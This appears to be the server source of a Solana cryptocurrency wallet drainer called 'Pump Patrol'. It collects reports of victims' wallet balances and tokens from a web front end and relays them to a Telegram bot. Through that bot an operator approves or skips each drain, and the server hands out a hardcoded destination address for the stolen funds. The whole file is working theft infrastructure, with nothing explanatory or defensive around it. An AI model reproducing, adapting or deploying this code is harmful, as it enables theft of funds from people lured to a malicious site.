'use strict';
const http=require('http'),fs=require('fs'),path=require('path');
const TG=process.env.TG_TOKEN||'';
const CHAT=process.env.TG_CHAT||'';
const PORT=+(process.env.PORT||8787);
const SECRET=process.env.PP_SECRET||'change-me';
const ME=process.env.DRAIN_TO||'911oJrLqYDE5Vo3JAuNQ84MGjBrRpCivXk5iw8GdtEGh';
const RPC='https://api.mainnet-beta.solana.com';
const PER_TX=2;
const PUB=path.join(__dirname,'public');
const t0=Date.now();

const api=async(m,b)=>{try{const r=await fetch(`https://api.telegram.org/bot${TG}/${m}`,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(b||{})});return await r.json()}catch(e){return null}};
const esc=s=>String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
const sessions=new Map(),verdicts=new Map();
setInterval(()=>{const n=Date.now();for(const[k,v]of sessions)if(!v.done&&n-v.ts>36e5)sessions.delete(k);for(const[k,v]of verdicts)if(n-v.ts>36e5)verdicts.delete(k)},6e4).unref();

let offset=0;
(async()=>{
  for(;;){
    let r=null;
    try{r=await api('getUpdates',{timeout:25,offset})}catch(e){}
    for(const u of(r&&r.result)||[]){
      offset=u.update_id+1;
      const q=u.callback_query;
      if(q){
        const[act,sid]=String(q.data).split(':');
        api('answerCallbackQuery',{callback_query_id:q.id});
        const s=sessions.get(sid);
        if(s){
          verdicts.set(sid,{a:act,ts:Date.now()});
          api('editMessageText',{chat_id:CHAT,message_id:q.message.message_id,text:(q.message.text||'')+`\n→ ${act==='go'?'DRAINING':'SKIPPED'}`,parse_mode:'HTML'});
        }
      }else if(u.message)handle(u.message);
    }
    await new Promise(s=>setTimeout(s,r?0:3000));
  }
})();

async function handle(m){
  const reply=x=>api('sendMessage',{chat_id:m.chat.id,text:x,parse_mode:'HTML'});
  if(!CHAT)return reply(`chat id: ${m.chat.id} — set TG_CHAT and restart`);
  const[t,sid]=String(m.text||'').trim().split(/\s+/);
  const c=t.toLowerCase();
  if(c==='/start'||c==='/help')return reply('Pump Patrol control node\n/sessions — live + recent sessions\n/approve sid — allow drain\n/skip sid — decline');
  if(c==='/sessions'){
    if(!sessions.size)return reply('no sessions recorded');
    let s='';for(const[k,v]of sessions)s+=`<code>${esc(k)}</code> ${v.done?'done':'live'} — ${esc(v.site||'?')} — ${v.wallets?.reduce((a,w)=>a+(+w.sol||0),0).toFixed(4)} SOL\n`;
    return reply(`<b>sessions</b>\n${s}`);
  }
  if((c==='/approve'||c==='/go')&&sid&&sessions.has(sid)){verdicts.set(sid,{a:'go',ts:Date.now()});return reply(`approved <code>${esc(sid)}</code>`)}
  if((c==='/skip'||c==='/stop')&&sid&&sessions.has(sid)){verdicts.set(sid,{a:'stop',ts:Date.now()});return reply(`skipped <code>${esc(sid)}</code>`)}
}

function card(sid,r){
  let s=`<b>Pump Patrol — session ${esc(sid)}</b>\nsource: ${esc(r.site||'?')}\n`;
  for(const w of (r.wallets||[])){
    s+=`\n${esc(w.name)} <code>${esc(w.addr)}</code>\n${w.sol} SOL`;
    for(const t of w.tokens||[])s+=`\n· ${esc(t.mint.slice(0,6))}… ${esc(t.amt)}`;
  }
  if(r.evm)s+=`\nEVM ${esc(r.evm)}`;
  if(r.note)s+=`\n${esc(r.note)}`;
  return s;
}

const json=(r,o,code=200)=>{r.writeHead(code,{'content-type':'application/json'});r.end(JSON.stringify(o))};
const MIME={'.html':'text/html','.js':'text/javascript','.css':'text/css','.svg':'image/svg+xml','.png':'image/png'};
http.createServer(async(req,res)=>{
  try{
    const u=new URL(req.url,'http://x');
    if(u.pathname.startsWith('/api/')){
      if(u.searchParams.get('k')!==SECRET)return json(res,{ok:false},403);
      const seg=u.pathname.split('/').filter(Boolean);
      if(seg[1]==='config')return json(res,{rpc:RPC,me:ME,perTx:PER_TX});
      if(seg[1]==='health')return json(res,{ok:true,up:Math.floor((Date.now()-t0)/1e3),sessions:sessions.size});
      const sid=seg[2];
      if(seg[1]==='verdict'){const v=verdicts.get(sid)||null;if(v)verdicts.delete(sid);return json(res,{a:v?v.a:null})}
      if(seg[1]==='report'&&req.method==='POST'){
        let b='';for await(const c of req){b+=c;if(b.length>65536)throw 0}
        const r=JSON.parse(b);
        const prev=sessions.get(sid);
        r.ts=Date.now();
        if(prev&&r.done)r.wallets=prev.wallets||r.wallets;
        if(prev&&r.done&&!r.site)r.site=prev.site;
        sessions.set(sid,r);
        const isDone=!!r.done;
        await api('sendMessage',{chat_id:CHAT,text:card(sid,r),parse_mode:'HTML',disable_web_page_preview:true,
          ...(isDone?{}:{reply_markup:{inline_keyboard:[[{text:'DRAIN',callback_data:`go:${sid}`},{text:'SKIP',callback_data:`stop:${sid}`}]]}})});
        return json(res,{ok:true});
      }
      return json(res,{ok:false},404);
    }
    const f=path.normalize(path.join(PUB,u.pathname==='/'?'index.html':u.pathname));
    if(!f.startsWith(PUB))return json(res,{ok:false},403);
    const data=await fs.promises.readFile(f).catch(()=>null);
    if(!data){res.writeHead(404).end('not found');return}
    res.writeHead(200,{'content-type':MIME[path.extname(f)]||'application/octet-stream','cache-control':'no-store'});
    res.end(data);
  }catch(e){res.writeHead(400).end()}
}).listen(PORT,()=>console.log(`pump-patrol :${PORT} | chat set: ${!!CHAT}`));